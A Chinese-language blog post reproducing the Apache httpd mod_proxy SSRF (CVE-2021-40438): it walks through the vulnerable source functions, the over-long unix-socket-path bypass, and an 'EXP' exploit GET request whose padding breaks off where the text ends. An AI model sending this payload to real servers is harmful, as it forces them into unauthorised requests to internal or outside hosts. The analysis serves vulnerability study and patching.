<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438) | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-16T07:09:23.557Z" id="date"> 2023-09-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-16T08:25:53.963Z" id="updated"> 2023-09-16</time></div></span><br><span>Word Count: <div class="control">5.1k</div></span><br><span>Read Time: <div class="control">20 min</div></span></div></div><hr><div id="post-content"><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01 前言</h2>
<p>又是一篇漏洞复现，虽然我至今复现了许多CVE漏洞，但心中总是感觉缺少点什么，复现的时候看到那些大佬的分析方法，步骤及思路，让我叹为观止（这令我产生了一种“错觉”？漏洞复现本就是深入底层代码去分析漏洞原理吗？）当然很明显本就应该这样做，但对于新手的我来说，这种方法却似乎成为了一堵高墙，我在想我究竟是要跟着大佬去代码世界走一遭还是单纯理解漏洞如何产生，影响范围，如何利用就好了。</p>
<p>虽然目前心中还是没有明确答案，但我似乎应该清醒一些，那些佬一定有着深厚的功底，因此这些复现的技术方法本就是他们的基操，而对于目前新手的我来说，面对如此庞大的代码量，且菜鸡的我目前为止，对于一些简单的代码程序的普通调试，也没有熟练甚至很菜。因此我认为我这或许潜移默化中形成了–眼高手低–的心理吗？</p>
<p>但不论如何说，什么能力办什么事，因此我目前为止对于此种漏洞的态度为，尽自己最大能力搞清楚原理，跟着大佬的思路走上一遭，哪怕记不住，但或许对自己代码审计能力也能提高一些，故此没必要焦虑，只希望自己在日后有能力之后，可以蓦然回首，遨游于代码世界。</p>
<p>上述也是发表了一下心中的小小感慨，但还是不够彻底，不过想起一句话，在自己目前认为什么也想干但却不知干什么，或者甚至什么也不想做，那也要在自己热爱的方面一直学下去，或许哪一篇文章，哪一句话，哪一个人，就给了你奇思妙想的思路。。。。不多说了，开始学习。</p>
<h2 id="0x02-前置知识"><a href="#0x02-前置知识" class="headerlink" title="0x02-前置知识"></a>0x02 前置知识</h2>
<p>这里呢就跟着佬的思路走一遍，过点脑子即可。</p>
<h3 id="Apache-Module综述"><a href="#Apache-Module综述" class="headerlink" title="Apache-Module综述"></a>Apache Module综述</h3>
<p>如果我们要部署一个PHP运行环境，且将Apache作为Web应用服务器，那么常用的有三种方法：</p>
<ol>
<li>Apache以CGI的形式运行PHP脚本</li>
<li>PHP以mod_php的方式作为Apache的一个模块运行</li>
<li>PHP以FPM的方式运行为独立服务，Apache使用mod_proxy_fcgi模块作为反代服务器将请求代理给PHP-FPM</li>
</ol>
<p>第一种方式比较古老，性能较差，基本已经淘汰；第二种方式在Apache环境下使用较广，配置最为简单；第三种方法也有较大用户体量，不过Apache仅作为一个中间的反代服务器，更多新的用户会选择使用性能更好的Nginx替代。</p>
<p>这其中，第三种方法使用的mod_proxy_fcgi就是本文主角mod_proxy模块的一个子模块。mod_proxy是Apache服务器中用于反代后端服务的一个模块，而它拥有数个不同功能的子模块，分别用于支持不同通信协议的后端，比如常见的有：</p>
<ul>
<li>mod_proxy_fcgi 用于反代后端是fastcgi协议的服务，比如php-fpm</li>
<li>mod_proxy_http 用于反代后端是http、https协议的服务</li>
<li>mod_proxy_uwsgi 用于反代后端是uwsgi协议的服务，主要针对uWSGI</li>
<li>mod_proxy_ajp 用于反代后端是ajp协议的服务，主要针对Tomcat</li>
<li>mod_proxy_ftp 用于反代后端是ftp协议的服务</li>
</ul>
<p>除去mod_proxy_fcgi用于反代PHP，我们在使用Node.js、Python等脚本语言编写的应用也常常会使用mod_proxy_http作为一层反代服务器，这样中间层可以做ACL、静态文件服务等。</p>
<p>这次的SSRF漏洞是出在mod_proxy这个模块中的，我们就来从代码的层面分析一下它的原理是什么，究竟影响有多大。</p>
<h2 id="0x03-漏洞原理分析"><a href="#0x03-漏洞原理分析" class="headerlink" title="0x03-漏洞原理分析"></a>0x03 漏洞原理分析</h2>
<p>《<a target="_blank" rel="noopener" href="https://firzen.de/building-a-poc-for-cve-2021-40438">Building a POC for CVE-2021-40438</a>》这篇文章中提到了这个漏洞的复现方法：当目标环境使用了mod_proxy做反向代理，比如<code>ProxyPass / &quot;http://localhost:8000/&quot;</code>，此时通过请求<code>http://target/?unix:&#123;'A'*5000&#125;|http://example.com/</code>即可向<code>http://example.com</code>发送请求，造成一个SSRF攻击。</p>
<p>这里面，Apache代码中犯得错误是在modules/proxy/proxy_util.c的fix_uds_filename函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * In the case of the reverse proxy, we need to see if we</span><br><span class="hljs-comment"> * were passed a UDS url (eg: from mod_proxy) and adjust uds_path</span><br><span class="hljs-comment"> * as required.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fix_uds_filename</span><span class="hljs-params">(request_rec *r, <span class="hljs-type">char</span> **url)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *ptr, *ptr2;<br>    <span class="hljs-keyword">if</span> (!r || !r-&gt;filename) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(r-&gt;filename, <span class="hljs-string">&quot;proxy:&quot;</span>, <span class="hljs-number">6</span>) &amp;&amp;<br>            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="hljs-string">&quot;unix:&quot;</span>)) &amp;&amp;<br>            (ptr = ap_strchr(ptr2, <span class="hljs-string">&#x27;|&#x27;</span>))) &#123;<br>        <span class="hljs-type">apr_uri_t</span> urisock;<br>        <span class="hljs-type">apr_status_t</span> rv;<br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);<br>        <span class="hljs-keyword">if</span> (rv == APR_SUCCESS) &#123;<br>            <span class="hljs-type">char</span> *rurl = ptr+<span class="hljs-number">1</span>;<br>            <span class="hljs-type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);<br>            apr_table_setn(r-&gt;notes, <span class="hljs-string">&quot;uds_path&quot;</span>, sockpath);<br>            *url = apr_pstrdup(r-&gt;pool, rurl); <span class="hljs-comment">/* so we get the scheme for the uds */</span><br>            <span class="hljs-comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span><br>            memmove(r-&gt;filename+<span class="hljs-number">6</span>, rurl, <span class="hljs-built_in">strlen</span>(rurl)+<span class="hljs-number">1</span>);<br>            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="hljs-number">0</span>, r,<br>                    <span class="hljs-string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,<br>                    sockpath, *url, r-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            *ptr = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>Apache在配置反代的后端服务器时，有两种情况：</p>
<ul>
<li>直接使用某个协议反代到某个IP和端口，比如<code>ProxyPass / &quot;http://localhost:8080&quot;</code></li>
<li>使用某个协议反代到unix套接字，比如<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code></li>
</ul>
<p>第一种情况比较好理解，第二种情况的设计我觉得不是很好，相当于让用户可以使用一个Apache自创的写法来配置后端地址。那么这时候就会涉及到parse的过程，需要将这种自创的语法转换成能兼容正常socket连接的结构，而fix_uds_filename函数就是做这个事情的。</p>
<p>使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件：</p>
<ul>
<li><code>r-&gt;filename</code>的前6个字符等于<code>proxy:</code></li>
<li><code>r-&gt;filename</code>的字符串中含有关键字<code>unix:</code></li>
<li><code>unix:</code>关键字后的部分含有字符<code>|</code></li>
</ul>
<p>当满足这三个条件后，将<code>unix:</code>后面的内容进行解析，设置成<code>uds_path</code>的值；将字符<code>|</code>后面的内容，设置成<code>rurl</code>的值。</p>
<p>举个例子，前面介绍中的<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code>，在解析完成后，<code>uds_path</code>的值等于<code>/var/run/www.sock</code>，<code>rurl</code>的值等于<code>http://localhost:8080/</code>。</p>
<p><strong>这里上一个GPT解释：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这段代码是 C 语言代码，用于 Apache HTTP 服务器的模块开发。该代码位于一个函数 `fix_uds_filename` 中，用于处理反向代理（reverse proxy）中的请求，特别是在处理传递了 UDS（Unix Domain Socket）URL 的情况下。<br><br>以下是对该代码的分析：<br><br>1. `fix_uds_filename` 函数是一个静态函数，它接受两个参数：`request_rec *r` 和 `char **url`。`request_rec` 是 Apache HTTP 服务器处理请求时的核心数据结构，而 `char **url` 是一个指向指针的指针，用于传递 URL。<br><br>2. 函数开始的注释解释了它的目的，即在反向代理中，检查是否传递了 UDS URL（例如来自 mod_proxy 模块），并根据需要调整 UDS 路径。<br><br>3. 接下来，代码对输入参数进行了一些基本的有效性检查，确保 `r` 和 `r-&gt;filename` 不为空。如果为空，函数就会直接返回，不执行后续操作。<br><br>4. 接下来，代码检查 `r-&gt;filename` 是否以 &quot;proxy:&quot; 开头，并且是否包含 &quot;unix:&quot; 和 &quot;|&quot;。这些条件用于识别传递的 UDS URL。<br><br>5. 如果满足条件，代码会使用 Apache 的函数 `ap_strcasestr` 和 `ap_strchr` 来分析 URL，并解析其中的 UDS 路径。<br><br>6. 一旦成功解析 UDS 路径，代码会将其存储在 `apr_table_t` 数据结构中的 &quot;uds_path&quot; 键下，并将 UDS URL 的剩余部分存储在 `url` 指针所指向的位置。<br><br>7. 接下来，代码更新 `r-&gt;filename`，将 &quot;proxy:&quot; 后面的部分替换为解析出的 UDS URL。<br><br>8. 最后，代码使用 `ap_log_rerror` 函数记录一条日志，指示已经因为 UDS URL 的存在而重写了 URL。<br><br>总之，这段代码的主要目的是在处理反向代理请求时，检查传递的 URL 是否包含 UDS 部分，如果包含，则解析出 UDS 路径，并进行一些必要的更新和日志记录。这有助于在反向代理中正确处理使用 Unix 域套接字的情况。<br></code></pre></td></tr></table></figure>
<p>这里我们先搞清楚代码是干什么的即可。</p>
<p>看到这里其实都没有什么问题，那么我们肯定会思考，<code>r-&gt;filename</code>是从哪来的，用户可控吗，为什么？</p>
<p>这时就要说到另一个函数，<code>proxy_hook_canon_handler</code>，这个函数用于注册canon handler，比如：</p>
<p>![image-20230916154849448](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916154849448.png)</p>
<p>可以看到，每一个<code>mod_proxy_xxx</code>都会注册一个自己的canon handler，canon handler会在反代的时候被调用，用于告诉Apache主程序它应该把这个请求交给哪个处理方法来处理。</p>
<p>比如，我们看到<code>mod_proxy_http</code>的<code>proxy_http_canon</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proxy_http_canon</span><span class="hljs-params">(request_rec *r, <span class="hljs-type">char</span> *url)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// first part</span><br>    <span class="hljs-keyword">if</span> (strncasecmp(url, <span class="hljs-string">&quot;http:&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>        url += <span class="hljs-number">5</span>;<br>        scheme = <span class="hljs-string">&quot;http&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(url, <span class="hljs-string">&quot;https:&quot;</span>, <span class="hljs-number">6</span>) == <span class="hljs-number">0</span>) &#123;<br>        url += <span class="hljs-number">6</span>;<br>        scheme = <span class="hljs-string">&quot;https&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> DECLINED;<br>    &#125;<br>    port = def_port = ap_proxy_port_of_scheme(scheme);<br><br>    <span class="hljs-comment">// second part</span><br>    ap_proxy_canon_netloc(r-&gt;pool, &amp;url, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;host, &amp;port);<br>    <span class="hljs-keyword">switch</span> (r-&gt;proxyreq) &#123;<br>    <span class="hljs-keyword">default</span>: <span class="hljs-comment">/* wtf are we doing here? */</span><br>    <span class="hljs-keyword">case</span> PROXYREQ_REVERSE:<br>        <span class="hljs-keyword">if</span> (apr_table_get(r-&gt;notes, <span class="hljs-string">&quot;proxy-nocanon&quot;</span>)) &#123;<br>            path = url;   <span class="hljs-comment">/* this is the raw path */</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            path = ap_proxy_canonenc(r-&gt;pool, url, <span class="hljs-built_in">strlen</span>(url),<br>                                     enc_path, <span class="hljs-number">0</span>, r-&gt;proxyreq);<br>            search = r-&gt;args;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> PROXYREQ_PROXY:<br>        path = url;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (path == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> HTTP_BAD_REQUEST;<br><br>    <span class="hljs-keyword">if</span> (port != def_port)<br>        apr_snprintf(sport, <span class="hljs-keyword">sizeof</span>(sport), <span class="hljs-string">&quot;:%d&quot;</span>, port);<br>    <span class="hljs-keyword">else</span><br>        sport[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (ap_strchr_c(host, <span class="hljs-string">&#x27;:&#x27;</span>)) &#123; <span class="hljs-comment">/* if literal IPv6 address */</span><br>        host = apr_pstrcat(r-&gt;pool, <span class="hljs-string">&quot;[&quot;</span>, host, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// fourth part</span><br>    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="hljs-string">&quot;proxy:&quot;</span>, scheme, <span class="hljs-string">&quot;://&quot;</span>, host, sport,<br>            <span class="hljs-string">&quot;/&quot;</span>, path, (search) ? <span class="hljs-string">&quot;?&quot;</span> : <span class="hljs-string">&quot;&quot;</span>, (search) ? search : <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这个函数中有三个主要的部分，第一部分检查了配置中的url的开头是不是<code>http:</code>或<code>https:</code>，如果不是，说明这个请求不该由<code>mod_proxy_http</code>模块处理，后续的过程跳过；第二部分，用各种方式获取到scheme、host、port、path、search等几个URL的组成变量；第三部分，拼接<code>proxy:</code>、scheme、<code>://</code>、host、sport、<code>/</code>、path、search，成为一个字符串，赋值给<code>r-&gt;filename</code>。</p>
<p>这里面，scheme、host、port来自于配置文件中配置的ProxyPass，而path、search来自于用户发送的数据包。也就是说，<code>r-&gt;filename</code>中的后半部分是用户可控的。</p>
<p>那我们回看前面的<code>fix_uds_filename</code>函数，它在<code>r-&gt;filename</code>中查找关键字<code>unix:</code>，并将这个关键字后面直到<code>|</code>的部分作为unix套接字地址，而将<code>|</code>后面的部分作为反代的后端地址。</p>
<p>我们可以通过请求的path或者search来控制这两个部分，控制了反代的后端地址，这也就是为什么这里会出现SSRF的原因。</p>
<h2 id="0x04-限制绕过"><a href="#0x04-限制绕过" class="headerlink" title="0x04-限制绕过"></a>0x04 限制绕过</h2>
<p>当然，这里面有一个问题，那就是Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。</p>
<p>可以来做个测试，我们发送这样一个请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?unix:/var/run/test.sock|http://example.com/</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br></code></pre></td></tr></table></figure>
<p>此时会得到一个503错误，错误日志会反馈这样的结果：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">[Mon Oct 18 00:14:38.634795 2021] [proxy:error] [pid 782180:tid 140737306797824] (2)No such file or directory: AH02454: HTTP: attempt to connect to Unix domain socket /var/run/test.sock (192.168.1.1) failed<br>[Mon Oct 18 00:14:38.634875 2021] [proxy_http:error] [pid 782180:tid 140737306797824] [client 192.168.1.142:59696] AH01114: HTTP: failed to make connection to backend: httpd-UDS<br></code></pre></td></tr></table></figure>
<p>找不到unix套接字<code>/var/run/test.sock</code>，这是当然。</p>
<p>我们不能让他把请求发送到unix套接字上，而是发送给我们需要的<code>|</code>后面的地址。</p>
<p>国外那位作者给出了一个非常巧妙的方法，在<code>fix_uds_filename</code>函数中，unix套接字的地址来自于下面这两行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);<br>apr_table_setn(r-&gt;notes, <span class="hljs-string">&quot;uds_path&quot;</span>, sockpath);<br></code></pre></td></tr></table></figure>
<p>如果这里<code>ap_runtime_dir_relative</code>函数返回值是null，则后面获取<code>uds_path</code>时将不会使用unix套接字地址，而变成普通的TCP连接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">uds_path = (*worker-&gt;s-&gt;uds_path ? worker-&gt;s-&gt;uds_path : apr_table_get(r-&gt;notes, <span class="hljs-string">&quot;uds_path&quot;</span>));<br><span class="hljs-keyword">if</span> (uds_path) &#123;<br>    <span class="hljs-keyword">if</span> (conn-&gt;uds_path == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">/* use (*conn)-&gt;pool instead of worker-&gt;cp-&gt;pool to match lifetime */</span><br>        conn-&gt;uds_path = apr_pstrdup(conn-&gt;pool, uds_path);<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>    conn-&gt;hostname = <span class="hljs-string">&quot;httpd-UDS&quot;</span>;<br>    conn-&gt;port = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>    conn-&gt;hostname = apr_pstrdup(conn-&gt;pool, uri-&gt;hostname);<br>    conn-&gt;port = uri-&gt;port;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>那么如何让<code>ap_runtime_dir_relative</code>的返回值是null？<code>ap_runtime_dir_relative</code>函数最后引用了apr库中的<code>apr_filepath_merge</code>函数，它的主要作用就是路径的join，用于处理相对路径、绝对路径、<code>../</code>连接。</p>
<p>这个函数中，当待join的两段路径长度+4大于<code>APR_PATH_MAX</code>，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">rootlen = <span class="hljs-built_in">strlen</span>(rootpath);<br>maxlen = rootlen + <span class="hljs-built_in">strlen</span>(addpath) + <span class="hljs-number">4</span>; <span class="hljs-comment">/* 4 for slashes at start, after</span><br><span class="hljs-comment">                                             * root, and at end, plus trailing</span><br><span class="hljs-comment">                                             * null */</span><br><span class="hljs-keyword">if</span> (maxlen &gt; APR_PATH_MAX) &#123;<br>    <span class="hljs-keyword">return</span> APR_ENAMETOOLONG;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>也就是说，我们只需要在<code>unix:</code>与<code>|</code>之间传入内容长度大概超过4092的字符串，就能构造出<code>uds_path</code>为null的结果，让Apache不再发送请求给unix套接字。</p>
<p>最后，这样构造出的请求成功触发SSRF漏洞：</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA